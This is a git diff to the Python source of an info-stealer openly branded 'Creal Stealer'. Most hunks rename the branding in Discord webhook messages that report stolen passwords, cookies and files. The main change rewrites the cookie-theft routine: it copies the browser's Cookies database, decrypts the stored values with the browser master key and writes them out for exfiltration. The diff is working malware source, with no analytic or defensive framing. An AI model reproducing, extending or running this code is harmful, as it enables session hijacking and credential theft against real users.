@@ -8,12 +8,14 @@ from json import loads as json_loads, load
 from ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer
 from urllib.request import Request, urlopen
 from json import loads, dumps
+import sqlite3
 import time
 import shutil
 from zipfile import ZipFile
 import random
 import re
 import subprocess
+from shutil import copy2
 
 #  THIS IS 1.1.6 VERSION
 #
@@ -330,7 +332,7 @@ def uploadToken(token, path):
                 "icon_url": f"{pfp}"
                 },
             "footer": {
-                "text": "CREAL STEALER",
+                "text": "Creal STEALER",
                 "icon_url": "https://cdn.discordapp.com/attachments/969959772780634152/1035817071830904842/8df7a3389893f1d1ce1d4351c4076440.jpg"
                 },
             "thumbnail": {
@@ -371,12 +373,12 @@ def upload(name, link):
                     "description": f"**Found**:\n{rb}\n\n**Data:**\n:cookie: • **{CookiCount}** Cookies Found\n:link: • [CrealCookies.txt]({link})",
                     "color": 14406413,
                     "footer": {
-                        "text": "@CREAL STEALER",
+                        "text": "@Creal STEALER",
                         "icon_url": "https://cdn.discordapp.com/attachments/969959772780634152/1035817071830904842/8df7a3389893f1d1ce1d4351c4076440.jpg"
                     }
                 }
             ],
-            "username": "CREAL",
+            "username": "Creal",
             "avatar_url": "https://cdn.discordapp.com/attachments/969959772780634152/1035817071830904842/8df7a3389893f1d1ce1d4351c4076440.jpg",
             "attachments": []
             }
@@ -397,12 +399,12 @@ def upload(name, link):
                     "description": f"**Found**:\n{ra}\n\n**Data:**\n🔑 • **{PasswCount}** Passwords Found\n:link: • [CrealPassword.txt]({link})",
                     "color": 14406413,
                     "footer": {
-                        "text": "@CREAL STEALER",
+                        "text": "@Creal STEALER",
                         "icon_url": "https://cdn.discordapp.com/attachments/969959772780634152/1035817071830904842/8df7a3389893f1d1ce1d4351c4076440.jpg"
                     }
                 }
             ],
-            "username": "CREAL",
+            "username": "Creal",
             "avatar_url": "https://cdn.discordapp.com/attachments/969959772780634152/1035817071830904842/8df7a3389893f1d1ce1d4351c4076440.jpg",
             "attachments": []
             }
@@ -425,12 +427,12 @@ def upload(name, link):
                     "name": "Creal | File Stealer"
                 },
                 "footer": {
-                    "text": "@CREAL STEALER",
+                    "text": "@Creal STEALER",
                     "icon_url": "https://cdn.discordapp.com/attachments/969959772780634152/1035817071830904842/8df7a3389893f1d1ce1d4351c4076440.jpg"
                 }
                 }
             ],
-            "username": "CREAL",
+            "username": "Creal",
             "avatar_url": "https://cdn.discordapp.com/attachments/969959772780634152/1035817071830904842/8df7a3389893f1d1ce1d4351c4076440.jpg",
             "attachments": []
             }
@@ -451,7 +453,7 @@ def upload(name, link):
 def writeforfile(data, name):
     path = os.getenv("TEMP") + f"\wp{name}.txt"
     with open(path, mode='w', encoding='utf-8') as f:
-        f.write(f"<--CREAL STEALER BEST -->\n\n")
+        f.write(f"<--Creal STEALER BEST -->\n\n")
         for line in data:
             if line[0] != '':
                 f.write(f"{line}\n")
@@ -511,42 +513,23 @@ def getPassw(path, arg):
     writeforfile(Passw, 'passw')
 
 Cookies = []    
-def getCookie(path, arg):
-    global Cookies, CookiCount
-    if not os.path.exists(path): return
-
-    pathC = path + arg + "/Cookies"
-    if os.stat(pathC).st_size == 0: return
-
-    tempfold = temp + "wp" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"
-
-    shutil.copy2(pathC, tempfold)
-    conn = sql_connect(tempfold)
-    cursor = conn.cursor()
-    cursor.execute("SELECT host_key, name, encrypted_value FROM cookies;")
-    data = cursor.fetchall()
-    cursor.close()
-    conn.close()
-    os.remove(tempfold)
-
-    pathKey = path + "/Local State"
-
-    with open(pathKey, 'r', encoding='utf-8') as f: local_state = json_loads(f.read())
-    master_key = b64decode(local_state['os_crypt']['encrypted_key'])
-    master_key = CryptUnprotectData(master_key[5:])
-
-    for row in data: 
-        if row[0] != '':
-            for wa in keyword:
-                old = wa
-                if "https" in wa:
-                    tmp = wa
-                    wa = tmp.split('[')[1].split(']')[0]
-                if wa in row[0]:
-                    if not old in cookiWords: cookiWords.append(old)
-            Cookies.append(f"{row[0]}   TRUE    /   FALSE   2597573456  {row[1]}    {DecryptValue(row[2], master_key)}")
-            CookiCount += 1
-    writeforfile(Cookies, 'cook')
+def cookies(self, name: str, path: str, profile: str) -> None:
+        path += '\\' + profile + '\\Network\\Cookies'
+        if not os.path.isfile(path):
+            return
+        copy2(path, "Cookievault.db")
+        conn = sqlite3.connect("Cookievault.db")
+        cursor = conn.cursor()
+        with open('.\\browser-cookies.txt', 'a', encoding="utf-8") as f:
+            for res in cursor.execute("SELECT host_key, name, path, encrypted_value,expires_utc FROM cookies").fetchall():
+                host_key, name, path, encrypted_value, expires_utc = res
+                value = self.decrypt_password(encrypted_value, self.masterkey)
+                if host_key and name and value != "":
+                    f.write("{}\t{}\t{}\t{}\t{}\t{}\t{}\n".format(
+                        host_key, 'FALSE' if expires_utc == 0 else 'TRUE', path, 'FALSE' if host_key.startswith('.') else 'TRUE', expires_utc, name, value))
+        cursor.close()
+        conn.close()
+        os.remove("Cookievault.db")
     
 def GetDiscord(path, arg):
     if not os.path.exists(f"{path}/Local State"): return
@@ -616,11 +599,11 @@ def GatherZips(paths1, paths2, paths3):
         "content": globalInfo(),
         "embeds": [
             {
-            "title": "CREAL Zips",
+            "title": "Creal Zips",
             "description": f"{wal}\n{ga}\n{ot}",
             "color": 15781403,
             "footer": {
-                "text": "@CREAL STEALER",
+                "text": "@Creal STEALER",
                 "icon_url": "https://cdn.discordapp.com/attachments/969959772780634152/1035817071830904842/8df7a3389893f1d1ce1d4351c4076440.jpg"
             }
             }
